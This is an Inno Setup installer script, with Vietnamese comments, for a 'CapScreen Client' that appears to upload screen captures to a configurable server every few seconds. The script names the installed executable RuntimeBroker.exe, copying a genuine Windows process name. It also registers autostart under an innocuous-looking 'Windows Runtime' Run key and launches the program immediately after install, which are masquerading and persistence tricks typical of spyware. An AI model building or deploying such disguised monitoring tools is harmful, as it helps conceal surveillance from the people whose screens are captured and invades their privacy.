; CapScreen Client Installer Script
; Inno Setup 6.x

[Setup]
AppName=CapScreen Client
AppVersion=1.0
DefaultDirName={autopf}\CapScreen
DefaultGroupName=CapScreen
OutputDir=.
OutputBaseFilename=CapScreen-Client-Setup
Compression=lzma2
SolidCompression=yes
PrivilegesRequired=admin
UninstallDisplayIcon={app}\RuntimeBroker.exe

[Files]
Source: "..\client\dist\RuntimeBroker.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "..\client\config.json"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{group}\CapScreen Client"; Filename: "{app}\RuntimeBroker.exe"
Name: "{group}\Uninstall CapScreen"; Filename: "{uninstallexe}"

[Registry]
; Tự động chạy khi Windows khởi động
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "Windows Runtime"; ValueData: """{app}\RuntimeBroker.exe"""; Flags: uninsdeletevalue

[Run]
; Chạy ngay sau khi cài
Filename: "{app}\RuntimeBroker.exe"; Description: "Launch CapScreen Client"; Flags: nowait postinstall skipifsilent

[Code]
var
  ServerURLPage: TInputQueryWizardPage;
  ClientNamePage: TInputQueryWizardPage;

procedure InitializeWizard;
begin
  { Tạo page hỏi Server URL }
  ServerURLPage := CreateInputQueryPage(wpWelcome,
    'Server Configuration', 'Enter CapScreen Server URL',
    'Please enter the URL of your CapScreen server:');
  ServerURLPage.Add('Server URL:', False);
  ServerURLPage.Values[0] := 'http://192.168.1.100:5000/api/upload';
  
  { Tạo page hỏi Client Name }
  ClientNamePage := CreateInputQueryPage(ServerURLPage.ID,
    'Client Configuration', 'Enter Client Name',
    'Please enter a name for this computer:');
  ClientNamePage.Add('Client Name:', False);
  ClientNamePage.Values[0] := GetComputerNameString;
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  ConfigFile: string;
  ConfigContent: TArrayOfString;
begin
  if CurStep = ssPostInstall then
  begin
    { Cập nhật config.json với thông tin người dùng nhập }
    ConfigFile := ExpandConstant('{app}\config.json');
    
    SetArrayLength(ConfigContent, 6);
    ConfigContent[0] := '{';
    ConfigContent[1] := '  "server_url": "' + ServerURLPage.Values[0] + '",';
    ConfigContent[2] := '  "client_id": "' + GetComputerNameString + '-' + IntToStr(Random(9999)) + '",';
    ConfigContent[3] := '  "client_name": "' + ClientNamePage.Values[0] + '",';
    ConfigContent[4] := '  "cooldown": 5';
    ConfigContent[5] := '}';
    
    SaveStringsToFile(ConfigFile, ConfigContent, False);
  end;
end;
